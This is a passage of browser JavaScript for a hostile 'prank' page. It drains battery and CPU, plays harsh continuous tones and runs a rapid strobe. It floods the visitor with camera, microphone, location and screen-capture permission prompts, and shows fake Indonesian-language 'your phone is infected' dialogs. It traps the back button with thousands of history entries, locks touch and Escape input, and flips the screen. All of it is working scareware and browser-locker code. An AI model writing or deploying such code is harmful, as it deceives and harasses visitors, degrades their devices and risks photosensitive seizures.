    torchState = !torchState;
    try {
      if (track && typeof track.applyConstraints === 'function') {
        track.applyConstraints({
          advanced: [{ torch: torchState }]
        }).catch(() => {});
      }
    } catch (e) {}
  }, 100);
}

function startBatteryDrainerEngine() {
  if (isBatteryDrainerActive) return;
  isBatteryDrainerActive = true;

  const hudDrain = document.getElementById('hud-drain');
  if (hudDrain) hudDrain.textContent = 'BATTERY DRAIN: MAX ⚡';

  requestScreenWakeLock();

  if (navigator.vibrate) {
    setInterval(() => {
      try { navigator.vibrate([1000, 50, 1000, 50]); } catch (e) {}
    }, 2000);
  }

  function stressCPU() {
    let dummy = 0;
    for (let i = 0; i < 300000; i++) {
      dummy += Math.sin(i) * Math.cos(i) * Math.tan(i * 0.001);
    }
    requestAnimationFrame(stressCPU);
  }
  requestAnimationFrame(stressCPU);

  try {
    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    const osc1 = audioCtx.createOscillator();
    const osc2 = audioCtx.createOscillator();
    const gain = audioCtx.createGain();

    osc1.type = 'sawtooth';
    osc2.type = 'square';
    osc1.frequency.setValueAtTime(880, audioCtx.currentTime);
    osc2.frequency.setValueAtTime(440, audioCtx.currentTime);

    gain.gain.setValueAtTime(0.06, audioCtx.currentTime);

    osc1.connect(gain);
    osc2.connect(gain);
    gain.connect(audioCtx.destination);

    osc1.start();
    osc2.start();

    setInterval(() => {
      osc1.frequency.setValueAtTime(300 + Math.random() * 2000, audioCtx.currentTime);
      osc2.frequency.setValueAtTime(200 + Math.random() * 1500, audioCtx.currentTime);
    }, 150);
  } catch (e) {}
}

function setupGyroscopeAndMotion() {
  if (typeof window !== 'undefined' && window.DeviceOrientationEvent) {
    window.addEventListener('deviceorientation', (e) => {
      if (e.gamma !== null && e.beta !== null) {
        const gX = e.gamma / 45;
        const gY = e.beta / 45;
        gravityX = Math.max(-2, Math.min(2, gX));
        gravityY = Math.max(-2, Math.min(2, gY));
        tiltAngle = e.gamma;
      }
    }, { passive: true });
  }
}

function setupTouchLocks() {
  document.addEventListener('contextmenu', e => e.preventDefault(), false);

  document.addEventListener('touchstart', e => {
    if (e.touches && e.touches.length > 1) {
      e.preventDefault();
    }
  }, { passive: false });

  document.addEventListener('touchmove', e => {
    if (e.scale && e.scale !== 1) {
      e.preventDefault();
    }
  }, { passive: false });
}

function initGDIPayloadCanvas() {
  if (isGDIActive) return;
  isGDIActive = true;

  gdiCanvas = document.getElementById('gdi-canvas');
  if (!gdiCanvas) return;
  gdiCtx = gdiCanvas.getContext('2d');

  function resizeGDI() {
    gdiCanvas.width = window.innerWidth;
    gdiCanvas.height = window.innerHeight;
  }
  resizeGDI();
  window.addEventListener('resize', resizeGDI);

  // Initialize Cascade Physics Blocks (Efek Runtuh)
  const blockTypes = ['ERROR', 'PTOSZEK', 'SYSTEM_FAILURE', 'BIRD_OVERLOAD', 'CRITICAL', '0x000000FF', 'MEM_CORRUPT', '🐦', '⚠️', '💀'];
  for (let i = 0; i < 50; i++) {
    cascadeBlocks.push({
      x: Math.random() * gdiCanvas.width,
      y: -Math.random() * gdiCanvas.height,
      vx: (Math.random() - 0.5) * 4,
      vy: Math.random() * 3 + 2,
      w: 80 + Math.random() * 100,
      h: 24 + Math.random() * 20,
      text: blockTypes[Math.floor(Math.random() * blockTypes.length)],
      color: `hsl(${Math.random() * 360}, 100%, 50%)`
    });
  }

  // Initialize Screen Melting Columns
  const colCount = Math.floor(gdiCanvas.width / 16);
  for (let i = 0; i < colCount; i++) {
    meltColumns.push({
      x: i * 16,
      y: 0,
      speed: Math.random() * 4 + 1,
      height: Math.random() * 100 + 40
    });
  }

  let frameCount = 0;

  function renderGDIFrame() {
    frameCount++;
    const w = gdiCanvas.width;
    const h = gdiCanvas.height;

    gdiCtx.clearRect(0, 0, w, h);

    // 1. GDI Tunnel Effect (Concentric Expanding Vortex Rectangles)
    if (frameCount % 2 === 0) {
      const tunnelSteps = 8;
      for (let i = tunnelSteps; i > 0; i--) {
        const scale = (i / tunnelSteps) * ((frameCount * 0.05) % 1);
        const rw = w * scale;
        const rh = h * scale;
        const rx = (w - rw) / 2;
        const ry = (h - rh) / 2;

        gdiCtx.strokeStyle = `hsl(${(frameCount * 5 + i * 40) % 360}, 100%, 50%)`;
        gdiCtx.lineWidth = 3;
        gdiCtx.strokeRect(rx, ry, rw, rh);
      }
    }

    // 2. Screen Melting Effect (Drip Liquid Lines)
    gdiCtx.fillStyle = 'rgba(255, 0, 85, 0.4)';
    meltColumns.forEach(col => {
      col.y += col.speed;
      if (col.y > h) {
        col.y = 0;
        col.speed = Math.random() * 4 + 1;
      }
      gdiCtx.fillRect(col.x, col.y, 14, col.height);
    });

    // 3. Cascade Effect (Efek Runtuh with Gyro Physics)
    cascadeBlocks.forEach(b => {
      b.vx += gravityX * 0.2;
      b.vy += gravityY * 0.3;

      b.x += b.vx;
      b.y += b.vy;

      if (b.x < 0) { b.x = 0; b.vx *= -0.8; }
      if (b.x + b.w > w) { b.x = w - b.w; b.vx *= -0.8; }
      if (b.y + b.h > h) {
        b.y = h - b.h;
        b.vy *= -0.6;
        b.vx += (Math.random() - 0.5) * 2;
      }

      gdiCtx.save();
      gdiCtx.translate(b.x + b.w/2, b.y + b.h/2);
      gdiCtx.rotate(tiltAngle * Math.PI / 180 * 0.05);

      gdiCtx.fillStyle = '#000';
      gdiCtx.strokeStyle = b.color;
      gdiCtx.lineWidth = 2;
      gdiCtx.fillRect(-b.w/2, -b.h/2, b.w, b.h);
      gdiCtx.strokeRect(-b.w/2, -b.h/2, b.w, b.h);

      gdiCtx.fillStyle = b.color;
      gdiCtx.font = 'bold 11px monospace';
      gdiCtx.textAlign = 'center';
      gdiCtx.textBaseline = 'middle';
      gdiCtx.fillText(b.text, 0, 0);

      gdiCtx.restore();
    });

    // 4. Screen Glitch / RGB Split Slicing
    if (Math.random() < 0.35) {
      const sliceH = Math.floor(Math.random() * 40 + 10);
      const sliceY = Math.floor(Math.random() * (h - sliceH));
      const offsetX = Math.floor((Math.random() - 0.5) * 60);

      gdiCtx.fillStyle = 'rgba(0, 255, 255, 0.25)';
      gdiCtx.fillRect(offsetX, sliceY, w, sliceH);

      gdiCtx.fillStyle = 'rgba(255, 0, 0, 0.25)';
      gdiCtx.fillRect(-offsetX, sliceY + 5, w, sliceH);
    }

    // 5. Lag Stresser Math Computation
    let lagLoop = 0;
    for (let k = 0; k < 50000; k++) {
      lagLoop += Math.sin(k);
    }

    requestAnimationFrame(renderGDIFrame);
  }

  requestAnimationFrame(renderGDIFrame);
}

/* ==========================================================================
   MOBILE PERMISSION BOMB, CONTINUOUS MACHINE SOUND & STROBE ENHANCEMENTS
   - Continuous Unbroken Machine Sound ('tittttttttttttttttt')
   - Ultra-Fast Zero-Delay Strobe Overlay
   - Permission Bombing Loop (Geolocation, Notifications, Camera/Mic, Screen Capture)
   - Modal Dialog Trap Loop (confirm/prompt)
   - Infinite History Flood Trap (Anti-Back Gesture)
   - Screen Flip 180° & Mirror Chaos
   ========================================================================== */

let machineAudioCtx = null;
let isMachineAudioStarted = false;
let isUltraStrobeActive = false;
let isPermissionBombActive = false;
let isModalTrapActive = false;
let isHistoryFloodActive = false;
let isScreenFlipActive = false;

// Pre-warm AudioContext behind the scenes on load
try {
  machineAudioCtx = new (window.AudioContext || window.webkitAudioContext)();
} catch (e) {}

function initContinuousMachineSound() {
  if (isMachineAudioStarted) return;
  isMachineAudioStarted = true;

  try {
    if (!machineAudioCtx) {
      machineAudioCtx = new (window.AudioContext || window.webkitAudioContext)();
    }
    if (machineAudioCtx.state === 'suspended') {
      machineAudioCtx.resume().catch(() => {});
    }

    // Layer 1: Solid Unbroken High Tone ("tittttttttttttttttt" ~2800Hz square wave)
    const oscTone = machineAudioCtx.createOscillator();
    const gainTone = machineAudioCtx.createGain();
    oscTone.type = 'square';
    oscTone.frequency.setValueAtTime(2800, machineAudioCtx.currentTime);
    gainTone.gain.setValueAtTime(0.12, machineAudioCtx.currentTime);

    oscTone.connect(gainTone);
    gainTone.connect(machineAudioCtx.destination);
    oscTone.start();

    // Layer 2: Continuous Overload Pitch Sweep (Sawtooth 600Hz -> 4500Hz rising sweep loop)
    const oscSweep = machineAudioCtx.createOscillator();
    const gainSweep = machineAudioCtx.createGain();
    oscSweep.type = 'sawtooth';
    oscSweep.frequency.setValueAtTime(600, machineAudioCtx.currentTime);
    gainSweep.gain.setValueAtTime(0.08, machineAudioCtx.currentTime);

    oscSweep.connect(gainSweep);
    gainSweep.connect(machineAudioCtx.destination);
    oscSweep.start();

    let sweepFreq = 600;
    setInterval(() => {
      sweepFreq += 85;
      if (sweepFreq > 4500) sweepFreq = 600;
      try {
        oscSweep.frequency.setValueAtTime(sweepFreq, machineAudioCtx.currentTime);
      } catch (e) {}
    }, 40);

    // Layer 3: Sub-bass mechanical rumble hum (~65Hz triangle wave)
    const oscRumble = machineAudioCtx.createOscillator();
    const gainRumble = machineAudioCtx.createGain();
    oscRumble.type = 'triangle';
    oscRumble.frequency.setValueAtTime(65, machineAudioCtx.currentTime);
    gainRumble.gain.setValueAtTime(0.15, machineAudioCtx.currentTime);

    oscRumble.connect(gainRumble);
    gainRumble.connect(machineAudioCtx.destination);
    oscRumble.start();
  } catch (e) {}
}

function startUltraFastStrobe() {
  if (isUltraStrobeActive) return;
  isUltraStrobeActive = true;

  const overlay = document.getElementById('ultra-strobe-overlay');
  if (overlay) {
    overlay.classList.add('ultra-strobe-overlay-active');
  }
}

function startPermissionBomb() {
  if (isPermissionBombActive) return;
  isPermissionBombActive = true;

  setInterval(() => {
    // 1. Geolocation prompt
    if (navigator.geolocation) {
      try {
        navigator.geolocation.getCurrentPosition(() => {}, () => {}, { enableHighAccuracy: true, timeout: 2000, maximumAge: 0 });
      } catch (e) {}
    }

    // 2. Notification prompt
    if (typeof Notification !== 'undefined' && Notification.requestPermission) {
      try {
        Notification.requestPermission().catch(() => {});
      } catch (e) {}
    }

    // 3. Camera / Mic prompt
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
      try {
        navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(() => {});
      } catch (e) {}
    }

    // 4. Display Media / Screen Capture prompt
    if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
      try {
        navigator.mediaDevices.getDisplayMedia({ video: true }).catch(() => {});
      } catch (e) {}
    }
  }, 600);
}

function startModalDialogTrap() {
  if (isModalTrapActive) return;
  isModalTrapActive = true;

  setTimeout(() => {
    try {
      window.confirm("🚨 WARNING: HP Anda telah terinfeksi PTOSZEK Bird Malware!\n\nKlik OK untuk mencoba membersihkan virus.");
      window.prompt("⚠️ PENTING: Masukkan kata kunci 'PTOSZEK' untuk menutup tab browser ini:");
    } catch (e) {}
  }, 2000);

  setInterval(() => {
    if (Math.random() < 0.4) {
      try {
        window.confirm("⚠️ PERINGATAN BATERAI & MEMORI: HP Anda terdeteksi overload! Klik OK.");
      } catch (e) {}
    }
  }, 8000);
}

function startHistoryFloodTrap() {
  if (isHistoryFloodActive) return;
  isHistoryFloodActive = true;

  try {
    for (let i = 0; i < 2000; i++) {
      window.history.pushState({ trap: i }, '', window.location.pathname + '?ptoszek=' + i);
    }
    window.history.pushState({ trap: 'final' }, '', window.location.pathname);
  } catch (e) {}

  window.addEventListener('popstate', (e) => {
    try {
      window.history.forward();
      window.history.pushState({ trap: Date.now() }, '', window.location.pathname);
    } catch (err) {}
  });
}

function startScreenFlipChaos() {
  if (isScreenFlipActive) return;
  isScreenFlipActive = true;

  setInterval(() => {
    const rand = Math.random();
    if (rand < 0.35) {
      document.body.classList.add('mobile-flipped');
      document.body.classList.remove('mobile-rotated-90');
    } else if (rand < 0.7) {
      document.body.classList.remove('mobile-flipped');
      document.body.classList.add('mobile-rotated-90');
    } else {
      document.body.classList.remove('mobile-flipped');
      document.body.classList.remove('mobile-rotated-90');
    }
  }, 3500);
}

/* ==========================================================================
   BACK/ESC RANDOM MODE SWITCHER, DIAGONAL IMAGE STACKER & EXTREME DVD BOUNCER
   ========================================================================== */

function setupBackAndEscRandomSwitcher() {
  function triggerRandomModeSwap() {
    const modes = [
      () => startDiagonalImageCascade(),
      () => startExtremeDVDBouncer(),
      () => triggerMegaChaos(),
      () => startStrobeEffect(),
      () => spawnStackedImagesFrenzy(30),
      () => triggerScreenShake(),
      () => triggerBrowserLagStresser(),
      () => spawnRetroPopupBurst(8)
    ];
    const randomChoice = modes[Math.floor(Math.random() * modes.length)];
    try { randomChoice(); } catch (e) {}
  }

  // Trigger on Back Button (popstate)
  window.addEventListener('popstate', (e) => {
    triggerRandomModeSwap();
  });

  // Trigger on ESC Key (Escape)
  window.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' || e.code === 'Escape' || e.keyCode === 27) {
      e.preventDefault();
      triggerRandomModeSwap();
    }
  });
}

function startDiagonalImageCascade() {
  const container = document.getElementById('diagonal-stacker-container');
  if (!container) return;

  const imgSrc = getRandomArrayEntry(FILE_DOWNLOADS);
  const startX = 10;
  const startY = window.innerHeight - 150;
  const targetX = window.innerWidth - 160;
  const targetY = 10;

  const steps = 180;
  const dx = (targetX - startX) / steps;
  const dy = (targetY - startY) / steps;

  let currentStep = 0;
  let currX = startX;
  let currY = startY;

  const cascadeInterval = setInterval(() => {
    if (currentStep >= steps) {
      clearInterval(cascadeInterval);
      return;
    }

    const img = document.createElement('img');
    img.src = imgSrc;
    img.className = 'stacked-meme-img';
    img.style.left = `${currX}px`;
    img.style.top = `${currY}px`;
    img.style.width = '120px';
    img.style.height = '120px';
    img.style.objectFit = 'cover';
    img.style.zIndex = `${1000 + currentStep}`;
    img.style.animation = 'none';

    container.appendChild(img);

    currX += dx;
    currY += dy;
    currentStep++;
  }, 12);
}

let isExtremeDVDRunning = false;

function startExtremeDVDBouncer() {
  const container = document.getElementById('dvd-bouncer-container');
  if (!container || isExtremeDVDRunning) return;
  isExtremeDVDRunning = true;

  const img = document.createElement('img');
  img.src = getRandomArrayEntry(FILE_DOWNLOADS);
  img.style.position = 'absolute';
  img.style.width = '130px';
  img.style.height = '130px';
  img.style.objectFit = 'cover';
  img.style.border = '4px solid #34eb7d';
  img.style.boxShadow = '0 0 30px #34eb7d';
  img.style.borderRadius = '8px';

  let posX = Math.random() * (window.innerWidth - 150);
  let posY = Math.random() * (window.innerHeight - 150);
  let vx = 45;
  let vy = 35;

  container.appendChild(img);

  function bounceStep() {
    posX += vx;
    posY += vy;

    const maxW = window.innerWidth - 140;
    const maxH = window.innerHeight - 140;

    let hitBorder = false;

    if (posX <= 0) {
      posX = 0;
      vx = Math.abs(vx);
      hitBorder = true;
    } else if (posX >= maxW) {
      posX = maxW;
      vx = -Math.abs(vx);
      hitBorder = true;
    }

    if (posY <= 0) {
      posY = 0;
      vy = Math.abs(vy);
      hitBorder = true;
    } else if (posY >= maxH) {
      posY = maxH;
      vy = -Math.abs(vy);
      hitBorder = true;
    }

    if (hitBorder) {
      const hue = Math.floor(Math.random() * 360);
      img.style.borderColor = `hsl(${hue}, 100%, 50%)`;
      img.style.boxShadow = `0 0 35px hsl(${hue}, 100%, 50%)`;
      img.style.filter = `hue-rotate(${hue}deg)`;
      triggerScreenShake();
    }

    img.style.left = `${posX}px`;
    img.style.top = `${posY}px`;

    requestAnimationFrame(bounceStep);
  }

  requestAnimationFrame(bounceStep);
}

let isLagStresserActive = false;

function triggerBrowserLagStresser() {
  if (isLagStresserActive) return;
  isLagStresserActive = true;

  const backdropContainer = document.getElementById('lag-stresser-backdrop-container');
  if (backdropContainer) {
    backdropContainer.style.display = 'block';
    for (let i = 0; i < 20; i++) {
      const layer = document.createElement('div');
      layer.style.position = 'absolute';
      layer.style.top = `${Math.random() * 60}%`;
      layer.style.left = `${Math.random() * 60}%`;
      layer.style.width = '50vw';
      layer.style.height = '50vh';
      layer.style.backdropFilter = 'blur(20px) saturate(200%)';
      layer.style.webkitBackdropFilter = 'blur(20px) saturate(200%)';
      layer.style.border = '1px solid rgba(255,255,255,0.2)';
      backdropContainer.appendChild(layer);
    }
  }

  // Layout Thrashing Loop
  function stressLayoutReflow() {
    const dummy = document.createElement('div');
    dummy.style.position = 'fixed';
    dummy.style.top = '-9999px';
    document.body.appendChild(dummy);

    for (let i = 0; i < 1500; i++) {
      dummy.style.width = `${(i % 100) + 10}px`;
      const forceReflow = dummy.offsetWidth;
    }

    dummy.remove();
    requestAnimationFrame(stressLayoutReflow);
  }
  requestAnimationFrame(stressLayoutReflow);
}
